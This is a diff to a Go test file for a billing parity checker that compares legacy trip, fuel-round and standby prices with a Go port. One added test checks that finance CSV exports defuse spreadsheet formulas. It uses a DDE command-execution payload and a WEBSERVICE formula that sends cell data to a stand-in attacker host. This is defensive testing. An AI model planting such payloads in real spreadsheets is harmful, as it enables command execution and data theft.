@@ -1,6 +1,9 @@
 package etl
 
 import (
+	"bytes"
+	"encoding/csv"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -92,6 +95,37 @@ func expect(t *testing.T, name string, v verdict, outcome, kase string) {
 	if v.outcome != outcome || v.kase != kase {
 		t.Errorf("%s: %s %s (%s), want %s %s", name, v.outcome, v.kase, v.note, outcome, kase)
 	}
+	if v.outcome != ParityExact && (v.kase == "" || v.note == "") {
+		t.Errorf("%s: a record that is not exact carries its case and a note: %+v", name, v)
+	}
+}
+
+// withFuel replaces the delivered-basis party's fuel rounds (copying the engine's tables).
+func withFuel(e *parityEngine, fuel ...compute.FuelAdjustment) *parityEngine {
+	out := &parityEngine{hubs: e.hubs, tables: map[string]parityTables{}}
+	for k, v := range e.tables {
+		out.tables[k] = v
+	}
+	tbl := out.tables[pDelivered]
+	tbl.fuel = fuel
+	out.tables[pDelivered] = tbl
+	return out
+}
+
+// band is the stored fuel band of a reference price.
+func band(price float64) (*float64, *float64) {
+	lo, hi, _ := compute.FuelBandRange(price)
+	return &lo, &hi
+}
+
+// setTripJobCategory is the trace that path leaves on a single trip it flipped to PRIMARY under fuel round f1
+// (fn:tripBillingOnDelivered.ts:849-920): the fuel id, the fuel date and billingManualOverride=false rewritten, the
+// round left as the earlier pricing stamped it.
+func setTripJobCategory(tr *parityTrip, round string) {
+	fid := "f1"
+	tr.tripCategory, tr.overrideFalse = "PRIMARY", true
+	tr.snapshot.FuelAdjustmentID, tr.storedFuelDate = &fid, "2026-07-01"
+	tr.stored.round = round
 }
 
 func TestParityTripCases(t *testing.T) {
@@ -122,6 +156,25 @@ func TestParityTripCases(t *testing.T) {
 	expect(t, "class outside the enum", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
 		tr.in.Task.TruckType, tr.legacyTruckType = "", "TRAILER"
 	})), ParityMismatch, MismatchClassOutOfEnum)
+	unexplained := e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		tr.in.Task.TruckType = ""
+		tr.stored.estimate, tr.stored.importID = 1500, "imp-unknown"
+	}))
+	expect(t, "blank class with a price the legacy 4WJ default does not reproduce", unexplained, ParityMismatch, MismatchAmount)
+	if !strings.Contains(unexplained.note, "4WJ default does not reproduce it") || unexplained.got.reason != string(compute.NoVehicleClass) {
+		t.Errorf("blank class mismatch note and Go side: %s %v", unexplained.note, unexplained.got)
+	}
+	voided4 := testParity()
+	tbl := voided4.tables[pDelivered]
+	tbl.rates = append(tbl.rates, compute.RateEntry{ID: "r8", LegacyDocID: "r8", PartyID: pDelivered, ImportID: "imp-r8", HubCode: "HUBA",
+		DestinationCode: "SOCE", VehicleClass: "4WJ", RateTHB: 950, EffectiveFrom: time.Date(2026, 8, 5, 0, 0, 0, 0, time.UTC),
+		JobCategory: compute.Primary, Voided: true})
+	voided4.tables[pDelivered] = tbl
+	expect(t, "blank class priced against a 4WJ card voided since", voided4.classifyTrip(trip(t, voided4, func(tr *parityTrip) {
+		tr.in.Task.TruckType = ""
+		tr.stored.estimate, tr.stored.importID = 997.5, "imp-r8"
+		tr.voided = []string{"rate entry r8"}
+	})), ParityAllowed, CaseSinceVoided)
 
 	fid := "f1"
 	expect(t, "SUPPLEMENTARY priced with fuel", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
@@ -129,6 +182,17 @@ func TestParityTripCases(t *testing.T) {
 		tr.stored.estimate, tr.stored.importID = 840, "imp-r5"
 		tr.snapshot.FuelAdjustmentID = &fid
 	})), ParityAllowed, CaseSuppPricedWithFuel)
+	// The browser writer never stamped the trip's category: SUPPLEMENTARY on the task only (the display category).
+	expect(t, "SUPPLEMENTARY on the task only, priced with fuel by the browser writer", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		tr.in.JobCategory = "SUPPLEMENTARY"
+		tr.stored.estimate, tr.stored.importID = 1155, "imp-r2"
+		tr.snapshot.FuelAdjustmentID = &fid
+	})), ParityAllowed, CaseSuppPricedWithFuel)
+	expect(t, "a PRIMARY trip on a SUPPLEMENTARY task is PRIMARY on display", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		tr.tripCategory, tr.in.JobCategory = "PRIMARY", "SUPPLEMENTARY"
+		tr.stored.estimate, tr.stored.importID = 1155, "imp-r2"
+		tr.snapshot.FuelAdjustmentID = &fid
+	})), ParityMismatch, MismatchAmount)
 
 	voided := func(tr *parityTrip) {
 		tr.stored.estimate, tr.stored.importID, tr.stored.round = 1260, "imp-r3", "2026-07-01"
@@ -161,16 +225,68 @@ func TestParityTripCases(t *testing.T) {
 	})), ParityMismatch, MismatchMissingBillDate)
 
 	expect(t, "stale provenance after setTripJobCategory", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
-		tr.tripCategory = "PRIMARY"
-		tr.stored.round = "2026-06-01"
+		setTripJobCategory(tr, "2026-06-01") // the fuel date it rewrote, the round it left
 	})), ParityAllowed, CaseStaleProvenance)
 	expect(t, "stale provenance without an explicit category", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		setTripJobCategory(tr, "2026-06-01")
+		tr.tripCategory = ""
+	})), ParityMismatch, MismatchProvenance)
+	expect(t, "an explicit category alone is not setTripJobCategory's trace", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		tr.tripCategory = "PRIMARY" // the delivery writer stamps it on every trip it prices
 		tr.stored.round = "2026-06-01"
 	})), ParityMismatch, MismatchProvenance)
+	expect(t, "without billingManualOverride=false the round is not left by setTripJobCategory", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		setTripJobCategory(tr, "2026-06-01")
+		tr.overrideFalse = false
+	})), ParityMismatch, MismatchProvenance)
 	expect(t, "a stale import id on a single trip is not setTripJobCategory's", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
-		tr.tripCategory = "PRIMARY"
+		setTripJobCategory(tr, "2026-07-01")
 		tr.stored.importID = "imp-other"
 	})), ParityMismatch, MismatchProvenance)
+
+	// Two fuel rounds with the same multiplier: Go selecting another round than the stored one leaves the amount equal
+	// and differs in the round and band, which is a selection difference (an R16 tie-break, a band-port defect), never
+	// staleness, even on a trip setTripJobCategory touched.
+	ref1, ref2 := 32.5, 33.5
+	jul, aug := time.Date(2026, 7, 1, 0, 0, 0, 0, time.UTC), time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC)
+	two := withFuel(e, compute.FuelAdjustment{ID: "f1", LegacyDocID: "f1", PartyID: pDelivered, EffectiveFrom: jul, RateMultiplier: 1.05,
+		ReferenceFuelPriceTHB: &ref1}, compute.FuelAdjustment{ID: "f2", LegacyDocID: "f2", PartyID: pDelivered, EffectiveFrom: aug,
+		RateMultiplier: 1.05, ReferenceFuelPriceTHB: &ref2})
+	asF1 := func(tr *parityTrip) {
+		fid := "f1"
+		tr.stored.round, tr.storedFuelDate, tr.snapshot.FuelAdjustmentID = "2026-07-01", "2026-07-01", &fid
+		tr.stored.bandLo, tr.stored.bandHi = band(ref1)
+	}
+	if got := trip(t, two, nil).stored; got.round != "2026-08-01" || got.fuelID != "f2" {
+		t.Fatalf("two rounds baseline: %+v", got)
+	}
+	expect(t, "Go selects another round of the same multiplier", two.classifyTrip(trip(t, two, func(tr *parityTrip) {
+		asF1(tr)
+		tr.tripCategory = "PRIMARY"
+	})), ParityMismatch, MismatchProvenance)
+	expect(t, "Go selects another round than setTripJobCategory did", two.classifyTrip(trip(t, two, func(tr *parityTrip) {
+		asF1(tr)
+		tr.tripCategory, tr.overrideFalse = "PRIMARY", true
+	})), ParityMismatch, MismatchProvenance)
+	expect(t, "a SUPPLEMENTARY -> PRIMARY flip whose old round is the fuel round's date (no band)", two.classifyTrip(trip(t, two, func(tr *parityTrip) {
+		fid := "f2"
+		tr.tripCategory, tr.overrideFalse = "PRIMARY", true
+		tr.snapshot.FuelAdjustmentID, tr.storedFuelDate = &fid, "2026-08-01"
+		tr.stored.bandLo, tr.stored.bandHi = nil, nil
+	})), ParityAllowed, CaseStaleProvenance)
+	// Delivered before 07:00 ICT on the switch day of f2, priced under f1 by the pre-ADR-0009 boundary: the amount is
+	// equal on a route whose card did not change, and the record stays switch_day_boundary.
+	switchDay := tripWith(t, two, func(tr *parityTrip) {
+		tr.in.Task.Destination = "HUBB"
+		tr.in.DeliveredAt = bkk(2026, 8, 1, 3, 0)
+	}, func(tr *parityTrip) {
+		asF1(tr)
+		tr.tripCategory, tr.overrideFalse = "PRIMARY", true
+	})
+	if switchDay.stored.estimate != 420 || switchDay.stored.importID != "imp-r6" {
+		t.Fatalf("switch-day baseline: %+v", switchDay.stored)
+	}
+	expect(t, "equal-amount switch-day row", two.classifyTrip(switchDay), ParityMismatch, MismatchSwitchDay)
 
 	expect(t, "legacy unpriced, Go prices", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
 		tr.stored = price{}
@@ -192,11 +308,27 @@ func TestParityTripCases(t *testing.T) {
 		tr.stampedParty, tr.stored.party = pPlan, pPlan
 		tr.stored.estimate = 1
 	})), ParityMismatch, MismatchParty)
+	expect(t, "another party with an equal amount and no stored import id", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		tr.stampedParty, tr.stored.party = pPlan, pPlan
+		tr.stored.importID, tr.stored.round, tr.stored.bandLo, tr.stored.bandHi = "", "", nil, nil
+	})), ParityMismatch, MismatchParty)
 
 	expect(t, "task missing", e.classifyTrip(trip(t, e, func(tr *parityTrip) { tr.hasTask = false })), ParityMismatch, MismatchTaskMissing)
-	expect(t, "multi-drop with one delivered stop", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+	noTask := e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		tr.hasTask, tr.hasSnapshot, tr.stored = false, false, price{}
+	}))
+	expect(t, "task missing, legacy never priced it either", noTask, ParityExact, "")
+	if noTask.got.String() != "unpriced (task_missing)" {
+		t.Errorf("the Go side of a taskless trip: %s", noTask.got)
+	}
+	oneStop := func(tr *parityTrip) {
 		tr.in.IsMultiDelivery, tr.in.StopProgressCount, tr.in.DeliveredStops = true, 2, []string{"SOCE"}
-	})), ParityMismatch, MismatchMultiStops)
+	}
+	expect(t, "multi-drop with one delivered stop", e.classifyTrip(trip(t, e, oneStop)), ParityMismatch, MismatchMultiStops)
+	expect(t, "multi-drop with one delivered stop, legacy never priced it either", e.classifyTrip(trip(t, e, func(tr *parityTrip) {
+		oneStop(tr)
+		tr.hasSnapshot, tr.stored = false, price{}
+	})), ParityExact, "")
 }
 
 func TestParityMultiDrop(t *testing.T) {
@@ -219,10 +351,17 @@ func TestParityMultiDrop(t *testing.T) {
 	expect(t, "priced with the fee the owner's D5 decision replaced", e.classifyTrip(mtrip(func(tr *parityTrip) {
 		tr.stored.estimate, tr.storedFee = 1215, f64(60)
 	})), ParityMismatch, MismatchFeeChanged)
-	expect(t, "multi-drop stale add and import id", e.classifyTrip(mtrip(func(tr *parityTrip) {
-		tr.tripCategory = "PRIMARY"
-		tr.stored.add, tr.stored.importID = -10, "imp-old"
-	})), ParityAllowed, CaseStaleProvenance)
+	// setTripJobCategory rewrites a multi-drop trip's fuel id but not its round, fuel date, add or import id.
+	staleMulti := func(round string) func(*parityTrip) {
+		return func(tr *parityTrip) {
+			fid := "f1"
+			tr.tripCategory, tr.overrideFalse = "PRIMARY", true
+			tr.snapshot.FuelAdjustmentID = &fid
+			tr.stored.add, tr.stored.importID, tr.stored.round, tr.storedFuelDate = -10, "imp-old", round, round
+		}
+	}
+	expect(t, "multi-drop stale add and import id", e.classifyTrip(mtrip(staleMulti("2026-06-01"))), ParityAllowed, CaseStaleProvenance)
+	expect(t, "multi-drop add and import id without the trace", e.classifyTrip(mtrip(staleMulti("2026-07-01"))), ParityMismatch, MismatchProvenance)
 }
 
 func TestParityDiff(t *testing.T) {
@@ -263,6 +402,23 @@ func TestParityStandby(t *testing.T) {
 	}
 	if v := e.classifyStandby(sb(standbyPrice{})); v.kase != MismatchNotComputed {
 		t.Errorf("legacy unpriced: %+v", v)
+	}
+	// A record stamped to one party whose links now resolve another with an equal fee: divergence #9 decides the
+	// party, so the party is compared.
+	fees := testParity()
+	for party, fee := range map[string]float64{pDelivered: 300, pPlan: 300} {
+		tbl := fees.tables[party]
+		tbl.standby, tbl.standbyFee = nil, f64(fee)
+		fees.tables[party] = tbl
+	}
+	moved := parityStandby{key: "S", in: compute.StandbyInput{CustomerPartyID: pPlan, EndedAt: in.EndedAt, CreatedAt: in.CreatedAt},
+		stored: standbyPrice{priced: true, party: pDelivered, estimate: 300, source: compute.RateSourceServiceFee}, taskBillingParty: pDelivered}
+	if v := fees.classifyStandby(moved); v.outcome != ParityMismatch || v.kase != MismatchParty || !moved.divergence9() {
+		t.Errorf("another party with an equal fee: %+v (divergence #9 %v)", v, moved.divergence9())
+	}
+	moved.stored.party = pPlan
+	if v := fees.classifyStandby(moved); v.outcome != ParityExact {
+		t.Errorf("the stamped party: %+v", v)
 	}
 	// No standby rate before 1 Jul: the oldest rate is selected (§6.9); without rates the fee prices it.
 	noRates := testParity()
@@ -330,6 +486,56 @@ func TestFinanceWindow(t *testing.T) {
 	}
 }
 
+// The finance reports are opened by the owner in a spreadsheet: source text (a QR trip number, a stop code a driver
+// typed) never starts a formula, and numbers stay numbers.
+func TestFinanceCSVCellsAreDefused(t *testing.T) {
+	evil1, evil2 := `=CMD|' /C CALC'!A0-1`, `=CMD|' /C CALC'!A0-2`
+	k1, ok1 := collapsesOnDash(evil1)
+	k2, ok2 := collapsesOnDash(evil2)
+	if !ok1 || !ok2 || k1 != k2 {
+		t.Fatalf("the two stop codes collapse to one key: %q %v %q %v", k1, ok1, k2, ok2)
+	}
+	trip := `=WEBSERVICE("HTTP:"&CHAR(47)&CHAR(47)&"EVIL.EXAMPLE?"&C2)`
+	rec := &Reconciliation{Match: true, Finance: &FinanceRun{}}
+	rec.add("spk_collisions", k1, evil1+" "+evil2, k1, true, "reported")
+	rec.add("parity_trip", trip+" (cust_spx 2026-09)", "-10.00", "+5", false, "@note")
+	rec.add("counters", "cust_spx 2026-08", -3, 1155.5, true, "")
+	rec.Finance.Parity = append(rec.Finance.Parity, ParityRow{Kind: "trip", Key: trip, Party: "-party", Period: "2026-09", Stored: "-10.00",
+		Go: "unpriced (no_rate)", Outcome: ParityMismatch, Case: MismatchAmount, Note: "=1+1"})
+	for name, write := range map[string]func(*bytes.Buffer) error{
+		"reconcile": func(b *bytes.Buffer) error { return rec.WriteCSV(b) },
+		"parity":    func(b *bytes.Buffer) error { return rec.WriteParityCSV(b) },
+	} {
+		var b bytes.Buffer
+		if err := write(&b); err != nil {
+			t.Fatal(err)
+		}
+		rows, err := csv.NewReader(&b).ReadAll()
+		if err != nil {
+			t.Fatal(err)
+		}
+		numbers := 0
+		for _, r := range rows[1:] {
+			for _, cell := range r {
+				if cell == "" || !strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
+					continue
+				}
+				if _, err := strconv.ParseFloat(cell, 64); err != nil {
+					t.Errorf("%s: a cell starts a formula: %q", name, cell)
+				} else {
+					numbers++
+				}
+			}
+		}
+		if numbers == 0 {
+			t.Errorf("%s: a negative or signed number stays a number", name)
+		}
+	}
+	if csvCell("-10.00") != "-10.00" || csvCell("NaN") != "NaN" || csvCell("-Inf") != "'-Inf" || csvCell("SPK-GW") != "SPK-GW" {
+		t.Error("csvCell")
+	}
+}
+
 func TestFeeWinner(t *testing.T) {
 	rows := []feeRow{{legacy: "a", amount: 50}, {legacy: "b", amount: 60}}
 	if *feeWinner(rows, false) != 50 || *feeWinner(rows, true) != 60 || feeWinner(nil, false) != nil {
@@ -341,5 +547,14 @@ func TestFeeWinner(t *testing.T) {
 	}
 	if !sameJSON([]any{map[string]any{"price": 32.94}}, []byte(`[{"price": 32.94}]`)) || !sameJSON(nil, []byte(`[]`)) {
 		t.Error("sameJSON")
+	}
+	// The statement count columns as the load writes them (docCtx.integer; absent, bad or negative = the default 0).
+	for _, c := range []struct {
+		v    any
+		want int64
+	}{{int64(3), 3}, {2.9, 2}, {"4", 4}, {nil, 0}, {"x", 0}, {int64(-1), 0}, {-0.5, 0}, {3e9, 0}} {
+		if got := loadedCount(c.v); got != c.want {
+			t.Errorf("loadedCount(%v) = %d, want %d", c.v, got, c.want)
+		}
 	}
 }
